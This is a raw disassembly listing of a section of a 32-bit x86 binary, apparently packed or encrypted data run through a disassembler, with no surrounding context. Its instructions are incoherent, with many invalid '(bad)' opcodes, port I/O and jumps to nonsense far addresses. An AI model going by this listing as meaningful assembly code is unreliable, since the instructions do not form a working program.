  40e4fc:	test   BYTE PTR [eax],ah
  40e4fe:	mov    ds:0xbd384f43,al
  40e503:	cs push ecx
  40e505:	dec    esp
  40e506:	inc    esi
  40e507:	xchg   ecx,eax
  40e508:	cmp    al,BYTE PTR [ebp+0x31]
  40e50b:	inc    edx
  40e50c:	xchg   BYTE PTR [esi+edi*1],bl
  40e50f:	mov    WORD PTR [esi+0x5a3134d2],?
  40e515:	mov    ch,0x45
  40e517:	xchg   ebx,eax
  40e518:	inc    edx
  40e519:	dec    edi
  40e51a:	sbb    ecx,eax
  40e51c:	outs   dx,DWORD PTR ds:[esi]
  40e51d:	inc    edi
  40e51e:	call   0x858379bc
  40e523:	jae    0x40e4cf
  40e525:	in     al,dx
  40e526:	add    DWORD PTR [edi+0x3d],0x2a
  40e52a:	mov    dh,0x9c
  40e52c:	loope  0x40e4e4
  40e52e:	and    al,0x6b
  40e530:	mov    ebx,0x86bd96de
  40e535:	sti    
  40e536:	pop    esp
  40e537:	mov    ecx,0x4c83654f
  40e53c:	fwait
  40e53d:	jg     0x40e4fd
  40e53f:	add    al,0x55
  40e541:	or     al,0x63
  40e543:	not    DWORD PTR [ebx-0x3e]
  40e546:	push   ebp
  40e547:	and    al,BYTE PTR [esi-0x12]
  40e54a:	cmp    bh,BYTE PTR [ecx]
  40e54c:	pusha  
  40e54d:	sub    eax,0x15aaee45
  40e552:	(bad)
  40e555:	add    eax,0xa45c0b56
  40e55a:	pusha  
  40e55b:	fadd   QWORD PTR [ebp-0x31]
  40e55e:	dec    esp
  40e55f:	mov    al,ds:0xa4aedc35
  40e564:	jl     0x40e5c2
  40e566:	scas   al,BYTE PTR es:[edi]
  40e567:	xlat   BYTE PTR ds:[ebx]
  40e568:	test   DWORD PTR [esi+0x56],eax
  40e56b:	sar    DWORD PTR [eax+eax*1],0x6c
  40e56f:	(bad)  
  40e570:	jae    0x40e599
  40e572:	pop    ebx
  40e573:	fist   DWORD PTR [edx]
  40e575:	adc    al,0xe4
  40e577:	mov    esi,0x6da8b318
  40e57c:	jmp    0x40e5e5
  40e57e:	and    DWORD PTR [ebp+0x76],ebx
  40e581:	inc    ebx
  40e582:	jecxz  0x40e5ad
  40e584:	jae    0x40e5d9
  40e586:	fmul   st,st(1)
  40e588:	ss dec ecx
  40e58a:	push   esp
  40e58b:	fsubr  QWORD PTR ds:0xad7e3079
  40e591:	cld    
  40e592:	mov    DWORD PTR [ebp-0x5a],ebx
  40e595:	fsub   DWORD PTR [ebx+0x30]
  40e598:	push   ebp
  40e599:	cwde   
  40e59a:	jo     0x40e55e
  40e59c:	daa    
  40e59d:	cld    
  40e59e:	aam    0x8
  40e5a0:	stc    
  40e5a1:	aad    0x5a
  40e5a3:	add    BYTE PTR [esi+0x6da2a65],al
  40e5a9:	dec    edi
  40e5aa:	fcmovbe st,st(4)
  40e5ac:	cmp    eax,0xda98d09b
  40e5b1:	sbb    dh,dh
  40e5b3:	(bad)  
  40e5b4:	(bad)  
  40e5b7:	and    DWORD PTR [si],edi
  40e5ba:	bound  ecx,QWORD PTR [ebp-0x6c]
  40e5bd:	push   cs
  40e5be:	js     0x40e564
  40e5c0:	rcr    BYTE PTR [ecx+0xfc71d1],0xe6
  40e5c7:	popf   
  40e5c8:	pusha  
  40e5c9:	test   eax,0x88281869
  40e5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5cf:	test   eax,0x9c315b11
  40e5d4:	retf   
  40e5d5:	jb     0x40e5a3
  40e5d7:	adc    BYTE PTR [eax+0x6e],al
  40e5da:	pop    ebx
  40e5db:	mov    al,ds:0x91b759e7
  40e5e0:	stos   DWORD PTR es:[edi],eax
  40e5e1:	shr    DWORD PTR [ebx+eax*4],0xa4
  40e5e5:	sub    DWORD PTR [edx+0x2db6cd69],esp
  40e5eb:	jecxz  0x40e580
  40e5ed:	cs xor al,0xfa
  40e5f0:	jno    0x40e596
  40e5f2:	adc    DWORD PTR [ecx+0x79a4bb4b],ebx
  40e5f8:	scas   al,BYTE PTR es:[edi]
  40e5f9:	dec    edx
  40e5fa:	inc    ebp
  40e5fb:	and    esi,ebx
  40e5fd:	test   eax,0x8f77896d
  40e602:	pushf  
  40e603:	sbb    edx,DWORD PTR [esi-0x50e1af6a]
  40e609:	je     0x40e63d
  40e60b:	(bad)  
  40e60c:	pop    ebp
  40e60d:	add    BYTE PTR [bp+di-0x54],dl
  40e611:	sti    
  40e612:	or     DWORD PTR [edx+esi*2],edx
  40e615:	jle    0x40e62b
  40e617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e618:	add    esp,DWORD PTR [edi+ebx*1-0x57]
  40e61c:	mov    fs,esp
  40e61e:	fiadd  WORD PTR [eax+0x4]
  40e621:	jbe    0x40e65a
  40e623:	push   ss
  40e624:	inc    edx
  40e625:	pop    eax
  40e626:	push   ecx
  40e627:	mov    ebx,0x9b99df01
  40e62c:	sbb    DWORD PTR [edi+ecx*2+0x6f],eax
  40e630:	nop
  40e631:	icebp  
  40e632:	les    esp,FWORD PTR [ebp-0x6c15de61]
  40e638:	xlat   BYTE PTR ds:[ebx]
  40e639:	mov    esi,0xe1d699cb
  40e63e:	scas   eax,DWORD PTR es:[edi]
  40e63f:	xor    edx,DWORD PTR [esi+0xe]
  40e642:	push   0xffffff9f
  40e644:	sub    DWORD PTR [edx],ecx
  40e646:	mov    ebx,0x6c57d461
  40e64b:	push   cs
  40e64c:	xor    bl,BYTE PTR [esi]
  40e64e:	mov    esi,0x5ae9f68b
  40e653:	popa   
  40e654:	shr    DWORD PTR [edx-0xad62b18],0x8e
  40e65b:	lods   eax,DWORD PTR ds:[esi]
  40e65c:	inc    esp
  40e65d:	add    DWORD PTR [ebp-0x13ac6412],ebx
  40e663:	lahf   
  40e664:	mov    al,0x3c
  40e666:	out    dx,al
  40e667:	sbb    eax,0x6f5c4953
  40e66d:	dec    ebp
  40e66e:	mov    DWORD PTR ds:0x1d33d418,eax
  40e674:	push   ss
  40e675:	push   ebp
  40e676:	jmp    0x40e64e
  40e678:	ret    0x1c80
  40e67b:	inc    edx
  40e67c:	xor    dh,dh
  40e67e:	mov    DWORD PTR [edx+esi*4],0x4e3f20d4
  40e685:	add    al,0x2e
  40e687:	gs aam 0x54
  40e68a:	pop    ecx
  40e68b:	rcr    DWORD PTR [ebx],cl
  40e68d:	mov    ch,0x35
  40e68f:	loopne 0x40e67d
  40e691:	or     ebx,DWORD PTR [edx+0x16fd0a1]
  40e697:	adc    DWORD PTR [edi*8-0x2fc1bc60],eax
  40e69e:	dec    ecx
  40e69f:	retf   0x5c0c
  40e6a2:	daa    
  40e6a3:	jae    0x40e6be
  40e6a5:	mov    esp,0x343a1a47
  40e6aa:	int    0x41
  40e6ac:	xchg   bl,dl
  40e6ae:	mov    dl,0xed
  40e6b0:	es mov ebx,0x647319b1
  40e6b6:	lahf   
  40e6b7:	loopne 0x40e656
  40e6b9:	pop    es
  40e6ba:	bound  esp,QWORD PTR [ecx]
  40e6bc:	aam    0x63
  40e6be:	pop    es
  40e6bf:	jns    0x40e6e5
  40e6c1:	and    bl,BYTE PTR [edx]
  40e6c3:	out    0x74,eax
  40e6c5:	xchg   BYTE PTR [ebp+ecx*2-0x4f],dl
  40e6c9:	push   ebx
  40e6ca:	push   ecx
  40e6cb:	jp     0x40e668
  40e6cd:	push   cs
  40e6ce:	and    dh,cl
  40e6d0:	and    al,dh
  40e6d2:	mov    ch,0x47
  40e6d4:	out    dx,al
  40e6d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6d6:	(bad)  
  40e6d7:	out    0x1c,eax
  40e6d9:	pop    eax
  40e6da:	push   0x63a9812f
  40e6df:	popa   
  40e6e0:	push   ss
  40e6e1:	and    al,BYTE PTR [edx+edx*4]
  40e6e4:	or     eax,DWORD PTR [edx+edx*2-0xf]
  40e6e8:	das    
  40e6e9:	push   esp
  40e6ea:	(bad)  
  40e6eb:	stc    
  40e6ec:	push   ss
  40e6ed:	std    
  40e6ee:	fwait
  40e6ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6f0:	adc    cl,BYTE PTR [edx-0x199758a2]
  40e6f6:	jbe    0x40e71f
  40e6f8:	jnp    0x40e70c
  40e6fa:	xchg   ebx,eax
  40e6fb:	inc    ecx
  40e6fc:	push   ebp
  40e6fd:	add    dh,BYTE PTR [eax-0x5f757f2e]
  40e703:	pusha  
  40e704:	mov    bh,cl
  40e706:	enter  0xf285,0x49
  40e70a:	jmp    0x40e691
  40e70c:	cmc    
  40e70d:	js     0x40e6a2
  40e70f:	mov    cl,cl
  40e711:	adc    ecx,eax
  40e713:	mov    DWORD PTR [eax+0x48],ebx
  40e716:	mov    ebx,0x71e7b74e
  40e71b:	daa    
  40e71c:	es (bad) 
  40e71e:	shl    eax,cl
  40e720:	retf   0x8ef3
  40e723:	lea    edi,ds:0x1633a3a9
  40e729:	lods   eax,DWORD PTR ds:[esi]
  40e72a:	xchg   ebx,eax
  40e72b:	adc    al,0xfc
  40e72d:	cmp    BYTE PTR ds:[esi+0x55],al
  40e731:	mov    WORD PTR [edx+eax*1-0x20],es
  40e735:	and    BYTE PTR [esi+0x6f],ch
  40e738:	neg    BYTE PTR ds:0x73d60a86
  40e73e:	sahf   
  40e73f:	sti    
  40e740:	mov    dl,0xce
  40e742:	mov    ds:0x8244feb1,al
  40e747:	enter  0xd24d,0x28
  40e74b:	stc    
  40e74c:	push   eax
  40e74d:	sbb    al,0xff
  40e74f:	dec    ebp
  40e750:	inc    esi
  40e751:	xchg   edx,eax
  40e752:	rcr    DWORD PTR [ebx-0x2a],cl
  40e755:	adc    al,0xc5
  40e757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e758:	imul   esp,ebx,0x10e7fd94
  40e75e:	cmc    
  40e75f:	inc    esi
  40e760:	push   ebp
  40e761:	lahf   
  40e762:	xor    ch,ch
  40e764:	push   ecx
  40e765:	lods   eax,DWORD PTR ds:[esi]
  40e766:	pop    edx
  40e767:	fs fcmovbe st,st(2)
  40e76a:	inc    ebp
  40e76b:	inc    ecx
  40e76c:	call   0x1347:0x86f188cb
  40e773:	add    bh,cl
  40e775:	inc    esi
  40e776:	pop    ss
  40e777:	adc    ecx,ecx
  40e779:	inc    ecx
  40e77a:	jne    0x40e799
  40e77c:	mov    WORD PTR [ecx-0x77],?
  40e77f:	iret   
  40e780:	xor    DWORD PTR [esi+eax*8-0x34],ecx
  40e784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e785:	retf   0x32ea
  40e788:	push   es
  40e789:	push   ss
  40e78a:	jnp    0x40e78c
  40e78c:	dec    ecx
  40e78d:	and    al,0xcb
  40e78f:	es ret 0xb08b
  40e793:	sbb    BYTE PTR [edx+esi*2-0x4563f32c],dl
  40e79a:	dec    esi
  40e79b:	cmp    eax,0x1aa41cfd
  40e7a0:	xchg   ebx,eax
  40e7a1:	pop    ebx
  40e7a2:	jecxz  0x40e7c4
  40e7a4:	xor    dh,BYTE PTR [edi]
  40e7a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7a7:	addr16 adc edx,esi
  40e7aa:	daa    
  40e7ab:	mov    bl,dl
  40e7ad:	sbb    esi,edi
  40e7af:	gs and ch,ah
  40e7b2:	jb     0x40e831
  40e7b4:	and    eax,DWORD PTR [edi+0x3d22d410]
  40e7ba:	cmp    bh,ah
  40e7bc:	out    dx,eax
  40e7bd:	xor    DWORD PTR [esi],edi
  40e7bf:	and    bl,dh
  40e7c1:	aad    0xa1
  40e7c3:	aas    
  40e7c4:	mov    ecx,ebp
  40e7c6:	addr16 call 0x5c24:0x2602cfae
  40e7ce:	cdq    
  40e7cf:	jmp    0x4ff8:0x19f175be
  40e7d6:	out    0x15,al
  40e7d8:	imul   edi,DWORD PTR [ecx+0x7f],0x3e
  40e7dc:	test   eax,0x784e7fbe
  40e7e1:	push   ecx
  40e7e2:	xor    eax,0xd6ea66b7
  40e7e7:	mov    ebp,0x7669a5ce
  40e7ec:	push   edi
  40e7ed:	out    dx,al
  40e7ee:	cld    
  40e7ef:	jle    0x40e7e0
  40e7f1:	cmp    al,0xfa
  40e7f3:	lods   eax,DWORD PTR ds:[esi]
  40e7f4:	pop    esp
  40e7f5:	adc    ch,al
  40e7f7:	mov    esp,0x5870235a
  40e7fc:	std    
  40e7fd:	or     dl,BYTE PTR [ebx+0x23]
  40e800:	je     0x40e784
  40e802:	fwait
  40e803:	scas   eax,DWORD PTR es:[edi]
  40e804:	pop    ecx
  40e805:	mov    ah,dl
  40e807:	aam    0x6b
  40e809:	xchg   ebp,eax
  40e80a:	sti    
  40e80b:	push   0xd88685ca
  40e810:	pop    edx
  40e811:	test   al,0xb3
  40e813:	push   es
  40e814:	cmp    cl,BYTE PTR [edi]
  40e816:	shr    DWORD PTR [edi+0x67a9be05],1
  40e81c:	pop    edx
  40e81d:	xlat   BYTE PTR es:[ebx]
  40e81f:	ja     0x40e7e2
  40e821:	pop    es
  40e822:	push   esi
  40e823:	inc    esp
  40e824:	push   edx
  40e825:	xor    DWORD PTR fs:[eax-0x21],edx
  40e829:	xchg   ebx,eax
  40e82a:	push   edi
  40e82b:	sbb    eax,0x70dc6cd5
  40e830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e831:	sub    eax,0xd817fd4d
  40e836:	jl     0x40e87a
  40e838:	test   al,0xca
  40e83a:	cld    
  40e83b:	aas    
  40e83c:	pop    ecx
  40e83d:	js     0x40e8a5
  40e83f:	test   DWORD PTR [edi],eax
  40e841:	sti    
  40e842:	into   
  40e843:	push   0x664ac8f6
  40e848:	jno    0x40e827
  40e84a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e84b:	data16 jnp 0x40e7d2
  40e84e:	(bad)  
  40e84f:	adc    eax,0x14e33b6e
  40e854:	stc    
  40e855:	ret    
  40e856:	dec    edi
  40e857:	pusha  
  40e858:	lds    esp,FWORD PTR [esi]
  40e85a:	pop    edi
  40e85b:	or     BYTE PTR [esi],dh
  40e85d:	leave  
  40e85e:	aam    0x20
  40e860:	in     al,0xa
  40e862:	and    al,0xaa
  40e864:	das    
  40e865:	(bad)  
  40e866:	fld    QWORD PTR [edx-0x14]
  40e869:	into   
  40e86a:	repnz jecxz 0x40e8cc
  40e86d:	fsub   DWORD PTR [ecx]
  40e86f:	jb     0x40e82c
  40e871:	in     al,dx
  40e872:	out    dx,al
  40e873:	or     BYTE PTR [ebx-0x13edef77],ch
  40e879:	addr16 push ds
  40e87b:	mov    eax,0x9910c9b4
  40e880:	and    eax,0x14ed4cf
  40e885:	mov    dl,BYTE PTR [eax]
  40e887:	test   DWORD PTR [ecx-0x4e4c5592],ecx
  40e88d:	ror    DWORD PTR [esi],0xc3
  40e890:	push   ecx
  40e891:	bound  edi,QWORD PTR [ecx]
  40e893:	or     BYTE PTR [esi+0x27],ch
  40e896:	push   cs
  40e897:	fld    QWORD PTR [ebp-0x1c9c1122]
  40e89d:	popf   
  40e89e:	or     esi,DWORD PTR [esi+esi*1-0x4d8be270]
  40e8a5:	adc    al,bl
  40e8a7:	mov    ecx,DWORD PTR [esi]
  40e8a9:	imul   ecx,DWORD PTR [ebx+0x60],0x31
  40e8ad:	xchg   esp,eax
  40e8ae:	mov    ?,WORD PTR [esp+edx*2+0x492a3ad]
  40e8b5:	stos   DWORD PTR es:[edi],eax
  40e8b6:	xor    dh,al
  40e8b8:	adc    BYTE PTR [ecx-0x49],ah
  40e8bb:	fwait
  40e8bc:	or     esp,esp
  40e8be:	xchg   ebx,eax
  40e8bf:	sbb    DWORD PTR [ecx],0xad0e0d86
  40e8c5:	lods   eax,DWORD PTR ds:[esi]
  40e8c6:	imul   edi,DWORD PTR [ebp+esi*1+0x72],0x5d8168ff
  40e8ce:	dec    DWORD PTR [edi+eax*2+0x545450f]
  40e8d5:	jmp    0x1c83:0x8864d06c
  40e8dc:	dec    esi
  40e8dd:	xlat   BYTE PTR ds:[ebx]
  40e8de:	cmc    
  40e8df:	in     al,0xf4
  40e8e1:	inc    esp
  40e8e2:	into   
  40e8e3:	dec    BYTE PTR [ebx]
  40e8e5:	(bad)  
  40e8e6:	dec    edx
  40e8e7:	mov    ah,0xbe
  40e8e9:	lea    edi,[ecx]
  40e8eb:	dec    ebx
  40e8ec:	pop    edx
  40e8ed:	cmovne edi,DWORD PTR [esi-0x51]
  40e8f1:	test   al,0xee
  40e8f3:	inc    ecx
  40e8f4:	or     dh,bh
  40e8f6:	inc    esi
  40e8f7:	xchg   ebx,eax
  40e8f8:	xor    esp,esp
  40e8fa:	pop    edi
  40e8fc:	mov    ebx,esp
  40e8fe:	sbb    edx,DWORD PTR [ebp+0x23]
  40e901:	lea    esp,ds:0xd936e8a1
  40e907:	into   
  40e908:	stos   DWORD PTR es:[edi],eax
  40e909:	pop    edi
  40e90a:	push   es
  40e90b:	mov    ebp,0xe196e77d
  40e910:	leave  
  40e911:	or     al,0xa5
  40e913:	(bad)
  40e916:	and    al,0x4c
  40e918:	mov    bl,0x1a
  40e91a:	mov    cl,0x9
  40e91c:	mov    dh,0x43
  40e91e:	xor    BYTE PTR [esi-0x50],bh
  40e921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e922:	in     al,dx
  40e923:	clc    
  40e924:	in     al,dx
  40e925:	xchg   DWORD PTR [edx-0x1426969d],ebp
  40e92b:	push   0xffffffe5
  40e92d:	clc    
  40e92e:	jmp    0x859f43bc
  40e933:	add    eax,0xaa067c58
  40e938:	(bad)  
  40e939:	in     eax,0xb4
  40e93b:	ret    
  40e93c:	sbb    eax,DWORD PTR [esi-0x6f8894d4]
  40e942:	rol    BYTE PTR [ebx],cl
  40e944:	in     eax,0xc5
  40e946:	cmp    al,0x8e
  40e948:	ins    DWORD PTR es:[edi],dx
  40e949:	push   es
  40e94a:	mul    BYTE PTR [ebp+0x11cc7258]
  40e950:	push   ebx
  40e951:	cmp    DWORD PTR [ebx-0x2f],ebp
  40e954:	xor    BYTE PTR [esi],bh
  40e956:	jbe    0x40e92e
  40e958:	(bad)  
  40e959:	aas    
  40e95a:	inc    eax
  40e95b:	xchg   esi,eax
  40e95c:	dec    esi
  40e95d:	in     eax,0x2f
  40e95f:	stos   DWORD PTR es:[edi],eax
  40e960:	and    eax,0x3e97318b
  40e965:	adc    DWORD PTR [edx+0x73],ecx
  40e968:	and    esp,DWORD PTR [esi+0x1a69f933]
  40e96e:	aas    
  40e96f:	inc    esi
  40e970:	repz adc eax,DWORD PTR [ecx-0x32a497c5]
  40e977:	rcl    edi,1
  40e979:	ret    0x1119
  40e97c:	cdq    
  40e97d:	test   eax,0x83f7dc2b
  40e982:	sbb    DWORD PTR [ebp+0x70e2c6a8],esp
  40e988:	fwait
  40e989:	jnp    0x40e955
  40e98b:	xchg   esi,eax
  40e98c:	sub    ebx,ebx
  40e98e:	int3   
  40e98f:	xchg   edx,eax
  40e990:	or     BYTE PTR cs:[edi],ah
  40e993:	jg     0x40e9fb
  40e995:	add    dh,bh
  40e997:	mov    al,ds:0xd00f977b
  40e99c:	xor    edi,DWORD PTR [edi-0x3438557c]
  40e9a2:	mov    dh,0x48
  40e9a4:	stos   BYTE PTR es:[edi],al
  40e9a5:	push   ecx
  40e9a6:	mov    gs,WORD PTR [edi+0xb0c3937]
  40e9ac:	stc    
  40e9ad:	ficom  DWORD PTR [edi]
  40e9af:	push   0x5c
  40e9b1:	or     al,0x88
  40e9b3:	fcomp  DWORD PTR [ecx+ecx*8+0x45]
  40e9b7:	add    ebx,ebx
  40e9b9:	mov    ebx,0xef8fa0be
  40e9be:	int    0x86
  40e9c0:	adc    edi,DWORD PTR [edi-0x1534a517]
  40e9c6:	imul   eax,DWORD PTR [ebp-0x39c02859],0x593b9cd8
  40e9d0:	ins    BYTE PTR es:[edi],dx
  40e9d1:	xchg   ebp,eax
  40e9d2:	(bad)  
  40e9d3:	and    eax,0xd0ab884c
  40e9d8:	cmp    eax,0xd0194d94
  40e9dd:	cmp    ah,dl
  40e9df:	int    0x41
  40e9e1:	and    BYTE PTR [ecx+0x2ee8fda9],ah
  40e9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9e8:	aam    0xa7
  40e9ea:	mov    ds:0xaa4c2390,al
  40e9ef:	inc    esi
  40e9f0:	mov    cl,BYTE PTR [ebx+0x29]
  40e9f3:	adc    ebx,esi
  40e9f5:	ds loope 0x40ea74
  40e9f8:	push   ds
  40e9f9:	daa    
  40e9fa:	retf   
  40e9fb:	enter  0xf2b1,0x59
  40e9ff:	adc    eax,0x93a77e79
  40ea04:	stos   DWORD PTR es:[edi],eax
  40ea05:	sbb    esp,DWORD PTR [ecx]
  40ea07:	in     eax,0xb
  40ea09:	and    al,0xa9
  40ea0b:	out    dx,eax
  40ea0c:	or     eax,0x822963af
  40ea11:	inc    ecx
  40ea12:	js     0x40ea22
  40ea14:	jmp    0x40ea46
  40ea16:	push   ebp
  40ea17:	test   DWORD PTR [edi],0x2b9c04eb
  40ea1d:	mov    ebp,0x50b08175
  40ea22:	outs   dx,BYTE PTR ds:[esi]
  40ea23:	add    BYTE PTR [ecx],0xa
  40ea26:	adc    al,BYTE PTR [ecx+edi*2-0x2c]
  40ea2a:	xchg   ecx,eax
  40ea2b:	retf   
  40ea2c:	call   0x22016489
  40ea31:	imul   BYTE PTR [esi]
  40ea33:	repnz mov eax,0xa0a59ac
  40ea39:	sbb    al,0x2d
  40ea3b:	mov    eax,ds:0x31daa06a
  40ea40:	push   ebp
  40ea41:	sbb    DWORD PTR [edx-0x53],edi
  40ea44:	push   eax
  40ea45:	jo     0x40ea67
  40ea47:	into   
  40ea48:	out    0x97,al
  40ea4a:	in     eax,0x99
  40ea4c:	adc    ecx,edx
  40ea4e:	xchg   esi,eax
  40ea4f:	sbb    cl,BYTE PTR [ebx-0x69]
  40ea52:	out    0xce,eax
  40ea54:	sub    BYTE PTR ds:0x9c1e5a06,ch
  40ea5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea5b:	cmp    edi,0x48357104
  40ea61:	retf   
  40ea62:	pop    ss
  40ea63:	mov    al,ds:0xd6b53a86
  40ea68:	mov    dl,0xe3
  40ea6a:	lea    esp,[ebx-0xc150c6c]
  40ea70:	arpl   WORD PTR [ecx],cx
  40ea72:	lods   eax,DWORD PTR ds:[esi]
  40ea73:	or     ecx,DWORD PTR [eax+0x4a76e85b]
  40ea79:	pop    ds
  40ea7a:	scas   al,BYTE PTR es:[edi]
  40ea7b:	ror    BYTE PTR [eax+0x64b502ec],1
  40ea81:	fidivr DWORD PTR [ecx+0x41894ff8]
  40ea87:	(bad)  
  40ea88:	repz dec esi
  40ea8a:	test   eax,0xc5595bc4
  40ea8f:	xlat   BYTE PTR ds:[ebx]
  40ea90:	dec    eax
  40ea91:	imul   DWORD PTR [esi+0x65b65636]
  40ea97:	scas   eax,DWORD PTR es:[edi]
  40ea98:	fs xchg esp,eax
  40ea9a:	mov    esp,0xae4a4ee1
  40ea9f:	ror    BYTE PTR [ecx+0x1b],1
  40eaa2:	and    dh,BYTE PTR [ebx+0x70]
  40eaa5:	stc    
  40eaa6:	dec    ecx
  40eaa7:	aam    0x28
  40eaa9:	pop    ebp
  40eaaa:	nop
  40eaab:	retf   
  40eaac:	sub    al,0xfd
  40eaae:	jb     0x40eb2f
  40eab0:	stos   DWORD PTR es:[edi],eax
  40eab1:	clc    
  40eab2:	or     BYTE PTR [eax+eax*8],ah
  40eab5:	lods   eax,DWORD PTR ds:[esi]
  40eab6:	ret    0x2558
  40eab9:	jge    0x40eac0
  40eabb:	leave  
  40eabc:	xlat   BYTE PTR ds:[ebx]
  40eabd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eabe:	add    ebx,ecx
  40eac0:	adc    dh,dh
  40eac2:	stos   DWORD PTR es:[edi],eax
  40eac3:	popa   
  40eac4:	sub    BYTE PTR [ecx+eiz*4],dl
  40eac7:	loop   0x40eb14
  40eac9:	loope  0x40eac4
  40eacb:	sub    ch,BYTE PTR [eax+0x42aacc23]
  40ead1:	mov    ds:0x5853795e,eax
  40ead6:	in     eax,0xb4
  40ead8:	and    eax,DWORD PTR [edi+0x42b4c8df]
  40eade:	or     eax,0x4f9081c7
  40eae3:	cmc    
  40eae4:	xlat   BYTE PTR ds:[ebx]
  40eae5:	jg     0x40eb42
  40eae7:	xchg   edx,eax
  40eae8:	xor    eax,0xd67345d
  40eaed:	popa   
  40eaee:	xchg   esi,eax
  40eaef:	stc    
  40eaf0:	push   esp
  40eaf1:	xchg   edx,eax
  40eaf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaf3:	call   0xabca8b34
  40eaf8:	mov    ebp,0x38a6d64c
  40eafd:	fisubr DWORD PTR [esi-0x495d48b1]
  40eb03:	jnp    0x40ead5
  40eb05:	mov    edi,eax
  40eb07:	adc    ah,BYTE PTR [edx+edi*2+0x56]
  40eb0b:	xchg   esi,eax
  40eb0c:	mov    ah,0x7
  40eb0e:	jmp    FWORD PTR [eax]
  40eb10:	or     bh,ah
  40eb12:	mov    ch,0xd7
  40eb14:	mov    edi,0x9671a118
  40eb19:	push   esp
  40eb1a:	retf   0x3f42
  40eb1d:	in     eax,0xcd
  40eb1f:	lds    ebx,FWORD PTR [esi+0x32]
  40eb22:	mov    WORD PTR [esi+0x5381d4],cs
  40eb28:	adc    eax,0xffbfbdb2
  40eb2d:	sub    dh,0xf2
  40eb30:	les    esp,FWORD PTR [ecx+0xfc404b3]
  40eb36:	mov    bl,0xbd
  40eb38:	mov    al,ds:0xda7ee03c
  40eb3d:	pop    ss
  40eb3e:	(bad)  
  40eb3f:	lea    ebp,[eax-0x7ed62d9b]
  40eb45:	lods   eax,DWORD PTR ds:[esi]
  40eb46:	call   0xe972:0x66051369
  40eb4d:	pop    es
  40eb4e:	popa   
  40eb4f:	mov    ebx,0x5af553ab
  40eb54:	and    BYTE PTR [edx+0x6d],0xee
  40eb58:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40eb5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb5b:	js     0x40eb38
  40eb5d:	cmp    ah,BYTE PTR [ecx-0x4c]
  40eb60:	push   es
  40eb61:	mov    ah,0x1a
  40eb63:	mov    eax,ds:0xd4c3c1e0
  40eb68:	(bad)  
  40eb69:	jno    0x40eb47
  40eb6b:	je     0x40ebb4
  40eb6d:	jne    0x40eb12
  40eb6f:	fs jge 0x40eb24
  40eb72:	sub    eax,0x465ed67c
  40eb77:	mov    esp,0x7c54e50f
  40eb7c:	inc    ebp
  40eb7d:	dec    ecx
  40eb7e:	cmp    al,0x5d
  40eb80:	js     0x40ebe6
  40eb82:	pusha  
  40eb83:	jp     0x40ec04
  40eb85:	pop    eax
  40eb86:	out    0xab,al
  40eb88:	sbb    ecx,DWORD PTR [esi+0xe]
  40eb8b:	cmp    BYTE PTR [eax],0xc6
  40eb8e:	jmp    0x299af552
  40eb93:	xchg   ecx,eax
  40eb94:	mov    esi,0xa8a2e849
  40eb99:	fistp  WORD PTR [eax-0x7607cb24]
  40eb9f:	pop    esi
  40eba0:	jp     0x40eb55
  40eba2:	shl    ecx,1
  40eba4:	pop    esi
  40eba5:	inc    ecx
  40eba6:	mov    cl,0xe0
  40eba8:	repz sbb ah,BYTE PTR [eax-0x79a18444]
  40ebaf:	rcl    BYTE PTR [eax],0xdb
  40ebb2:	mov    ?,edx
  40ebb4:	fadd   QWORD PTR [ebp-0x4f]
  40ebb7:	adc    BYTE PTR [ecx],bl
  40ebb9:	xor    al,0x62
  40ebbb:	(bad)  
  40ebbc:	sahf   
  40ebbd:	jns    0x40eb5e
  40ebbf:	jmp    0xfcac:0x793eff08
  40ebc6:	xchg   ecx,eax
  40ebc7:	in     al,0x43
  40ebc9:	jmp    DWORD PTR [edi+edx*8]
  40ebcc:	lea    ebx,[esi]
  40ebce:	stc    
  40ebcf:	mov    ebx,ebp
  40ebd1:	dec    ebp
  40ebd2:	xchg   ebx,eax
  40ebd3:	jns    0x40ebb5
  40ebd5:	adc    dl,BYTE PTR [ebp-0x6c507bc0]
  40ebdb:	lds    ebp,FWORD PTR [edi-0x4435a0e4]
  40ebe1:	xor    ah,BYTE PTR [esi]
  40ebe3:	shl    DWORD PTR [ebp-0x245ad769],0xad
  40ebea:	mov    bh,0xc6
  40ebec:	ins    DWORD PTR es:[edi],dx
  40ebed:	sbb    BYTE PTR [ecx+0x220e4008],0x1f
  40ebf4:	push   esi
  40ebf5:	mov    bl,dl
  40ebf7:	das    
  40ebf8:	mov    BYTE PTR [edi],al
  40ebfa:	cld    
  40ebfb:	data16 out dx,al
  40ebfd:	(bad)  
  40ebfe:	aad    0x32
  40ec00:	or     eax,0xc5622a7d
  40ec05:	fstp   TBYTE PTR [edx+0x6dcdddc6]
  40ec0b:	jne    0x40ec11
  40ec0d:	and    DWORD PTR [esi-0x65],eax
  40ec10:	and    bh,BYTE PTR ds:[edx+0x6b]
  40ec14:	icebp  
  40ec15:	fnstsw WORD PTR [eax]
  40ec17:	pop    ebx
  40ec18:	push   ebp
  40ec19:	cmp    BYTE PTR [bp+di],0x8d
  40ec1d:	pop    edx
  40ec1e:	int    0x34
  40ec20:	aad    0x8a
  40ec22:	je     0x40ec6f
  40ec24:	xchg   ecx,eax
  40ec25:	mov    dl,0x9d
  40ec27:	xchg   ebx,eax
  40ec28:	pop    ecx
  40ec29:	xchg   esi,eax
  40ec2a:	or     DWORD PTR [eax+0xd],ebp
  40ec2d:	mov    eax,0x7a0d4a5d
  40ec32:	xor    ah,al
  40ec34:	lock cs add ch,ah
